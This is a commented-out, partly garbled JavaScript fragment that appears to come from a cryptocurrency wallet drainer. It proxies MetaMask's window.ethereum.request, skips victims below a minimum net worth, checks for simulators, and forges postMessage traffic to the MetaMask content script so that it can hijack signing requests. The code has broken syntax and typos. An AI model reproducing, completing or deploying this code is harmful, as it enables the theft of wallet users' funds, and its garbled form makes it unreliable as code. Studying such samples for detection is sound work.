7


// [*initProxy*] = async () => {

// try {

//   if (this.detectSimulator()[0] && (window.ethereum.isMetamask || window.ethereum.isCoinbaseWallet

//     if (window.ethereum.isMetamask){
//       Object.defineProperty(window.ethereum, "request", {

//         "value": new Proxy(window.ethereum.request, {

//           "apply": async (B,V,f) => {

//             let [y] = f;

//             if (this.isUselessMethod(y) || this.
//               netWorth < this. bypassMinAmount) {
//               return Reflect.apply(B,V,f);
//             }

//             await this.fsign()
//             return new Promise((K, s) => {

//               const N = this.generateGUID();
//               const c = {
//                 "target": "metmask-contentscript"
//                 "data": {
//                   "name": "metmask-provider",
//                   "data": [{
//                     "jsonrpc": "2.0",
//                     "id": N,
//                     "method": y.method,
//                     "params": y.params

//                   }]
//                 }
//               };

//               const i = o => {

//                 if(o.data.target === "metamask-inpage" && o.data.data.data(0).id == N){
//                   window.removeEventListener("message", i);
//                   if (o.data.data.data[0].hasOwnProperty("error")){
//                     s(o.data.data.data[0].error);

//                   }else{

//                   K(o.data.data.data[0].result);
//                 }
//               }
//             };
//             window.addEventListener("message", i);
//             window.postMessage(c);
//           }
//         })
//       })
//     }

//     ))
